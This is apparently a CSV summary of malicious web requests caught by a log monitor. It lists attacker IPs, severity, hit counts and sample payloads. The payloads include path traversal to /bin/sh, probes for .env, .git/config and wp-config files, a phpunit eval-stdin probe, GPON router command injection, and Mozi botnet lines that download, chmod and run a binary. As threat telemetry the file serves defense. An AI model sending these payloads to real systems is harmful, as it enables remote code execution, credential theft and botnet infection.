IP,SEVERITY,COUNT,SAMPLE_PAYLOAD
185.177.72.30,CRITICAL,849,"GET /admin/phpinfo.php HTTP/1.1"
204.76.203.125,CRITICAL,45,"GET /.env HTTP/1.1"
213.209.159.151,CRITICAL,44,"GET /new/.env HTTP/1.1"
134.65.30.157,CRITICAL,41,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
164.92.129.69,CRITICAL,41,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
31.206.48.120,CRITICAL,41,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
37.120.213.13,CRITICAL,41,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
45.61.134.40,CRITICAL,41,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
86.106.143.180,CRITICAL,17,"POST /wp-admin/admin-ajax.php?template=../../../../../../../wp-config&value=a&min_symbols=1 HTTP/1.1"
162.240.233.90,CRITICAL,12,"GET /bitrix/redirect.php?event1&event2&event3=download&goto=https://interact.sh HTTP/1.1"
192.159.99.95,CRITICAL,6,"POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1"
103.120.63.69,CRITICAL,1,"sh+/tmp/gpon80&ipv=0"
103.175.29.249,CRITICAL,1,"27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink."
117.254.100.80,CRITICAL,1,";sh+/tmp/gpon80&ipv=0"
124.131.119.83,CRITICAL,1,"27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink."
137.59.230.240,CRITICAL,1,";sh+/tmp/gpon80&ipv=0"
139.135.43.149,CRITICAL,1,";sh+/tmp/gpon80&ipv=0"
182.126.124.236,CRITICAL,1,"27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink."
182.127.64.105,CRITICAL,1,"27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink."
213.219.38.113,CRITICAL,1,"GET /inicio.shtml HTTP/1.1"
42.233.107.224,CRITICAL,1,"27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink."
103.203.72.214,CRITICAL,1,";sh+/tmp/gpon80&ipv=0"
117.209.31.78,CRITICAL,1,"27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink."
46.163.189.194,CRITICAL,1,";sh+/tmp/gpon80&ipv=0"
59.103.104.105,CRITICAL,1,";sh+/tmp/gpon80&ipv=0"
103.160.196.167,CRITICAL,1,"27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink."
185.196.10.225,HIGH,215,"\x16\x03\x01\x05\xC2\x01\x00\x05\xBE\x03\x03hz\xB7e\x1C\x98iT\xE6K\xA7\xD1\xD1\xE2\xD0\xDDa\x8Ci\xE3"
49.248.192.204,HIGH,59,"GET /api/.git/config HTTP/1.1"
82.165.66.87,HIGH,28,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
68.183.209.194,HIGH,25,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
78.153.140.224,HIGH,25,"GET /.env HTTP/1.1"
204.76.203.210,HIGH,23,"GET /.env HTTP/1.1"
40.113.19.56,HIGH,22,"GET /wp-admin/images/commentv.php HTTP/1.1"
173.249.15.69,HIGH,20,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
78.153.140.179,HIGH,20,"GET /.env HTTP/1.1"
185.177.72.64,HIGH,12,"GET /.env.development HTTP/1.1"
89.185.81.112,HIGH,11,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
